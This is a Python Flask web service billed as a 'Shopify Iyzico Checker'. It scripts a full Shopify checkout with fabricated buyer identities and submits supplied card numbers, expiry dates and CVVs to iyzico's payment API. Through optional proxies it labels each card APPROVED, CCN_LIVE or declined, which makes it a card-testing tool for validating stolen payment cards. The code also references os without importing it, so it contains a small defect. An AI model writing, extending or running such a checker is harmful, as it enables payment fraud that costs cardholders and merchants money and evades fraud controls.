import re
import json
import time
import uuid
import random
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

class IyzicoChecker:
    def __init__(self):
        self.session = requests.Session()
        self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36'
        self.base_url = ''
        self.cart_token = ''
        self.checkout_url = ''
        self.session_token = ''
        self.queue_token = ''
        self.attempt_token = ''
        self.stable_id = ''
        self.signed_handle = ''
        self.iyzi_token = ''
        self.iyzi_session_id = ''
        self.iyzi_cookie = ''
        self.currency = 'TRY'
        self.price = 0.0
        self.variant_id = ''
        self.product_path = ''
        self.payment_identifier = ''
        self.delivery_handle = ''
        self.tax_amount = '0.00'

    def set_proxy(self, proxy):
        if proxy:
            self.session.proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }

    def generate_uuid(self):
        return str(uuid.uuid4())

    def req(self, url, method='GET', headers=None, data=None, extra_cookies=None):
        if headers is None: headers = {}
        
        if extra_cookies:
            self.session.cookies.set('iyzi', extra_cookies.replace('iyzi=', ''))

        try:
            if method == 'POST':
                r = self.session.post(url, headers=headers, data=data, timeout=30, allow_redirects=False, verify=False)
            else:
                r = self.session.get(url, headers=headers, timeout=30, allow_redirects=False, verify=False)
            return {'status': r.status_code, 'headers': dict(r.headers), 'body': r.text, 'redirect': r.headers.get('Location', '')}
        except Exception as e:
            return {'status': 0, 'headers': {}, 'body': str(e), 'redirect': ''}

    def scrape_product_page(self):
        url = f"{self.base_url}/products/{self.product_path}"
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'user-agent': self.user_agent, 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate'
        }
        res = self.req(url, 'GET', headers)
        if res['status'] != 200: return False
        body = res['body']

        m = re.search(r'"variantId"\s*:\s*"?(\d+)"?', body)
        if m: self.variant_id = m.group(1)
        else:
            m = re.search(r'"id"\s*:\s*"gid:\/\/shopify\/ProductVariant\/(\d+)"', body)
            if m: self.variant_id = m.group(1)

        m = re.search(r'"price"\s*:\s*"?([0-9.]+)"?', body)
        if m: self.price = float(m.group(1))

        m = re.search(r'"currency"\s*:\s*"?([A-Z]{3})"?', body)
        if m: self.currency = m.group(1)

        m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([a-f0-9]{32})"', body)
        if m: self.payment_identifier = m.group(1)

        return bool(self.variant_id)

    def add_to_cart(self):
        url = f"{self.base_url}/cart/add.js"
        headers = {
            'accept': '*/*', 'content-type': 'application/json',
            'origin': self.base_url, 'referer': f"{self.base_url}/products/{self.product_path}",
            'user-agent': self.user_agent, 'sec-fetch-dest': 'empty', 'sec-fetch-site': 'same-origin'
        }
        
        self.session.cookies.set('localization', 'TR')
        self.session.cookies.set('_shopify_y', self.generate_uuid())
        self.session.cookies.set('_shopify_s', self.generate_uuid())
        self.session.cookies.set('shopify_client_id', self.generate_uuid())

        data = json.dumps({'items': [{'id': int(self.variant_id), 'quantity': 1, 'properties': {}}]})
        res = self.req(url, 'POST', headers, data)

        if res['status'] != 200: return False
        
        cart = self.session.cookies.get('cart', '')
        self.cart_token = cart.split('?')[0] if cart else ''
        return True

    def get_checkout(self):
        url = f"{self.base_url}/checkouts/cn/{self.cart_token}/tr-tr"
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'referer': f"{self.base_url}/products/{self.product_path}",
            'user-agent': self.user_agent, 'sec-fetch-dest': 'document', 'upgrade-insecure-requests': '1'
        }

        for _ in range(5):
            res = self.req(url, 'GET', headers)
            if 300 <= res['status'] < 400 and res['redirect']:
                url = res['redirect'] if res['redirect'].startswith('http') else f"{self.base_url}{res['redirect']}"
                continue
            break

        if res['status'] != 200: return False
        body = res['body']
        self.checkout_url = url

        m = re.search(r'sessionToken["\s:]+["\'](AAE[A-Za-z0-9_\-+=\/]+)["\']', body)
        if m: self.session_token = m.group(1)
        
        m = re.search(r'queueToken["\s:]+["\'](Ax[A-Za-z0-9_\-+=\/]+)["\']', body)
        if m: self.queue_token = m.group(1)

        self.attempt_token = f"{self.cart_token}-{uuid.uuid4().hex[:16]}"
        self.stable_id = self.generate_uuid()

        m = re.search(r'signedHandle["\s:]+["\']([\w\+\/=\-]+)["\']', body)
        if m: self.signed_handle = m.group(1)

        if not self.payment_identifier:
            m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([a-f0-9]{32})"', body)
            if m: self.payment_identifier = m.group(1)

        m = re.search(r'"handle"\s*:\s*"([a-f0-9]{32}-[a-f0-9]{32})"', body)
        if m: self.delivery_handle = m.group(1)

        m = re.search(r'checkouts\/cn\/([\w]+)', self.checkout_url)
        if m: self.cart_token = m.group(1)

        return True

    def submit_for_completion(self, email, first_name, last_name, phone):
        url = f"{self.base_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion"
        headers = {
            'accept': 'application/json', 'content-type': 'application/json',
            'origin': self.base_url, 'referer': self.checkout_url,
            'user-agent': self.user_agent, 'sec-fetch-dest': 'empty', 'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.cart_token}", type="cn"',
            'x-checkout-one-session-token': self.session_token,
            'x-checkout-web-build-id': 'f2ebb8978752bcfad85c28a708877d9082499349',
            'x-checkout-web-source-id': self.cart_token
        }

        address = {'address1': 'dogkkdmdf', 'city': 'ISTANBUL', 'countryCode': 'TR', 'firstName': first_name, 'lastName': last_name, 'phone': phone}
        pay_id = self.payment_identifier or '0b9b116d56e4115db6dd6d489111b44e'
        del_hdl = self.delivery_handle or 'ba5eae04f72fa075fafa5d02fe76a7b9-ae29b6b82cd53e4966aaa0d41946eae0'

        payload = {
            'variables': {
                'input': {
                    'sessionInput': {'sessionToken': self.session_token},
                    'queueToken': self.queue_token or 'Axpn1k41cyum8f-hOiMOFANKERyquhRmF9N9gvscLQem1Y7x3LVw-i6SDHWsNASwbSWJpTd48nQHrsliDSESikeFIEfKnvEDF1tKsnskB_o2pqb1g6j_iNnh4IhYUvsI93JpRmjxzA15LBw=',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{'destination': {'streetAddress': address}, 'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': del_hdl, 'customDeliveryRate': False}, 'options': {}}, 'targetMerchandiseLines': {'lines': [{'stableId': self.stable_id}]}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'value': {'amount': '0.00', 'currencyCode': self.currency}}, 'destinationChanged': False}],
                        'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': [{'signedHandle': self.signed_handle}] if self.signed_handle else []},
                    'merchandise': {'merchandiseLines': [{'stableId': self.stable_id, 'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{self.variant_id}', 'variantId': f'gid://shopify/ProductVariant/{self.variant_id}', 'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}}, 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'value': {'amount': f'{self.price:.2f}', 'currencyCode': self.currency}}, 'lineComponentsSource': None, 'lineComponents': []}]},
                    'memberships': {'memberships': []},
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{'paymentMethod': {'directPaymentMethod': None, 'giftCardPaymentMethod': None, 'redeemablePaymentMethod': None, 'walletPaymentMethod': None, 'walletsPlatformPaymentMethod': None, 'localPaymentMethod': None, 'paymentOnDeliveryMethod': None, 'paymentOnDeliveryMethod2': None, 'manualPaymentMethod': None, 'customPaymentMethod': None, 'offsitePaymentMethod': {'name': 'iyzico - Kredi ve Banka Kartları', 'paymentMethodIdentifier': pay_id, 'billingAddress': {'streetAddress': address}}, 'customOnsitePaymentMethod': None, 'deferredPaymentMethod': None, 'customerCreditCardPaymentMethod': None, 'paypalBillingAgreementPaymentMethod': None, 'remotePaymentInstrument': None}, 'amount': {'value': {'amount': str(round(self.price)), 'currencyCode': self.currency}}}],
                        'billingAddress': {'streetAddress': address}
                    },
                    'buyerIdentity': {'customer': {'presentmentCurrency': self.currency, 'countryCode': 'TR'}, 'email': email, 'emailChanged': False, 'phoneCountryCode': 'TR', 'marketingConsent': [{'email': {'consentState': 'GRANTED', 'value': email}}], 'shopPayOptInPhone': {'number': phone, 'countryCode': 'TR'}, 'rememberMe': False},
                    'tip': {'tipLines': []}, 'taxes': {'proposedAllocations': None, 'proposedTotalAmount': None, 'proposedTotalIncludedAmount': {'value': {'amount': self.tax_amount, 'currencyCode': self.currency}}, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                    'note': {'message': None, 'customAttributes': [{'key': 'il-adi', 'value': 'ISTANBUL'}, {'key': 'Ilce', 'value': ''}, {'key': 'Mahalle', 'value': ''}]},
                    'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None, 'scriptFingerprint': {'signature': None, 'signatureUuid': None, 'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []}, 'optionalDuties': {'buyerRefusesDuties': False}, 'cartMetafields': []
                },
                'attemptToken': self.attempt_token, 'metafields': [],
                'analytics': {'requestUrl': self.checkout_url, 'pageId': self.generate_uuid().upper()}
            },
            'operationName': 'SubmitForCompletion',
            'id': 'b6047b61264c44776db6b89cce9be9f2b646e9226af0681d7e7a0af7c1321293'
        }

        res = self.req(url, 'POST', headers, json.dumps(payload))
        data = json.loads(res['body']) if res['body'] else {}

        sub = data.get('data', {}).get('submitForCompletion', {})
        if sub:
            act = sub.get('action', {})
            r_url = act.get('redirectUrl') or act.get('url')
            if r_url:
                m = re.search(r'retrieve\/([a-f0-9\-]+)', r_url, re.I)
                if m: self.iyzi_session_id = m.group(1)
                return r_url

            po = sub.get('receipt', {}).get('purchaseOrder', {})
            for a in po.get('actions', []):
                r_url = a.get('redirectUrl') or a.get('url', '')
                if 'iyzipay' in r_url:
                    m = re.search(r'retrieve\/([a-f0-9\-]+)', r_url, re.I)
                    if m: self.iyzi_session_id = m.group(1)
                    return r_url

        m = re.search(r'iyzipay\.com[^"\']*retrieve\/([a-f0-9\-]+)', res['body'], re.I)
        if m:
            self.iyzi_session_id = m.group(1)
            return f'https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/{self.iyzi_session_id}'
            
        return None

    def get_iyzico_page(self, iyzi_url):
        headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': self.user_agent, 'sec-fetch-site': 'cross-site', 'upgrade-insecure-requests': '1'}
        for _ in range(5):
            res = self.req(iyzi_url, 'GET', headers)
            if 300 <= res['status'] < 400 and res['redirect']:
                iyzi_url = res['redirect']
                continue
            break

        if not res['body']: return False
        
        m = re.search(r'iyziToken["\s:=]+["\']([\w\-]+)["\']', res['body'])
        if m: self.iyzi_token = m.group(1)

        self.iyzi_cookie = self.session.cookies.get('iyzi', '')
        if not self.iyzi_session_id:
            m = re.search(r'retrieve\/([a-f0-9\-]+)', iyzi_url, re.I)
            if m: self.iyzi_session_id = m.group(1)
        return True

    def submit_card(self, cc, mm, yy, cvv, holder):
        url = 'https://api.iyzipay.com/payment/iyzipos/checkoutform/auth/ecom'
        headers = {
            'Accept': 'application/json', 'Content-Type': 'application/json',
            'Origin': 'https://api.iyzipay.com',
            'Referer': f'https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/{self.iyzi_session_id}',
            'User-Agent': self.user_agent, 'X-IYZI-TOKEN': self.iyzi_token,
            'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin'
        }

        payload = {
            'installment': 1, 'paidPrice': self.price, 'paymentChannel': 'WEB',
            'paymentCard': {'cardNumber': cc, 'cardHolderName': holder, 'expireYear': yy, 'expireMonth': mm, 'cvc': cvv, 'registerConsumerCard': False, 'registerCard': 0},
            'browserFingerprint': {'language': 'tr', 'timezone': -180, 'hasSessionStorage': True, 'hasLocalStorage': True, 'hasIndexedDb': True, 'hasOpenDb': True, 'platform': 'false', 'hasLiedLanguage': False, 'hasLiedResolution': False, 'hasLiedOS': False, 'hasLiedBrowser': False, 'maxTouchPoints': 0, 'touchEventSuccess': False, 'hasTouchStart': False, 'fingerprintHash': ''},
            'pwiMetadata': {'lightRedesign': ['false'], 'pwiGrowthActionDisabled': ['false']}
        }
        return self.req(url, 'POST', headers, json.dumps(payload), 'iyzi=' + self.iyzi_cookie if self.iyzi_cookie else None)

    def check(self, site, cc_input, proxy=''):
        start = time.time()
        if proxy: self.set_proxy(proxy)

        site = site.rstrip('/')
        if not site.startswith('http'): site = 'https://' + site
        
        m = re.search(r'/products/([^\/\?]+)', site)
        if not m: return self.resp(cc_input, 'ERROR', False, start, 'Invalid site URL', proxy)
        
        self.product_path = m.group(1)
        self.base_url = f"{site.split('//')[0]}//{site.split('//')[1].split('/')[0]}"

        parts = cc_input.split('|')
        if len(parts) != 4: return self.resp(cc_input, 'ERROR', False, start, 'Invalid CC format', proxy)
        cc, mm, yy, cvv = [p.strip() for p in parts]

        email = f'user{random.randint(1000,9999)}@gmail.com'
        phone = f'5{random.randint(300000000, 599999999)}'

        if not self.scrape_product_page(): return self.resp(cc_input, 'ERROR', False, start, 'Scrape failed', proxy)
        if not self.add_to_cart(): return self.resp(cc_input, 'ERROR', False, start, 'Cart failed', proxy)
        if not self.get_checkout(): return self.resp(cc_input, 'ERROR', False, start, 'Checkout failed', proxy)
        
        iyzi_url = self.submit_for_completion(email, 'Mehmet', 'Yilmaz', phone)
        if not iyzi_url: return self.resp(cc_input, 'ERROR', False, start, 'Submit failed', proxy)
        if not self.get_iyzico_page(iyzi_url): return self.resp(cc_input, 'ERROR', False, start, 'Iyzico page failed', proxy)
        if not self.iyzi_token: return self.resp(cc_input, 'ERROR', False, start, 'No token', proxy)

        res = self.submit_card(cc, mm, yy, cvv, 'Mehmet Yilmaz')
        data = json.loads(res['body']) if res['body'] else {}

        r_code, status = 'UNKNOWN', False
        if data:
            st = data.get('status', ''); err = data.get('errorMessage', ''); ec = data.get('errorCode', '')
            if st == 'success': r_code, status = 'APPROVED', True
            elif st == 'failure':
                if '10051' in ec or 'bakiye' in err: r_code, status = 'CCN_LIVE', True
                else: r_code = 'CARD_DECLINED'
            else: r_code = 'CARD_DECLINED'
        else: r_code = 'ERROR'

        return self.resp(cc_input, r_code, status, start, res['body'], proxy)

    def resp(self, cc, r_code, status, start, raw, proxy):
        msg = r_code
        try:
            d = json.loads(raw)
            msg = d.get('errorMessage') or d.get('status') or r_code
            if r_code == 'CCN_LIVE': msg = f"CCN LIVE - {d.get('errorMessage', '')}"
        except: pass
        return {
            "Currency": self.currency or 'TRY',
            "Gateway": "Shopify Payments",
            "Price": self.price or 0,
            "Proxy": "Live" if proxy else "Direct",
            "Response": msg,
            "Status": status,
            "Time": f"{round(time.time() - start, 2)}s",
            "cc": cc
        }

@app.route('/shopify')
def shopify():
    site = request.args.get('site', '')
    cc = request.args.get('cc', '')
    proxy = request.args.get('proxy', '')

    if not site or not cc:
        return jsonify({"error": "Missing params", "usage": "?site=URL&cc=CC|MM|YY|CVC&proxy=ip:port"}), 400

    checker = IyzicoChecker()
    return jsonify(checker.check(site, cc, proxy))

@app.route('/')
def index():
    return jsonify({
        "service": "Shopify Iyzico Checker",
        "endpoint": "/shopify",
        "example": "/shopify?site=https://example.com/products/item&cc=CC|MM|YY|CVC"
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
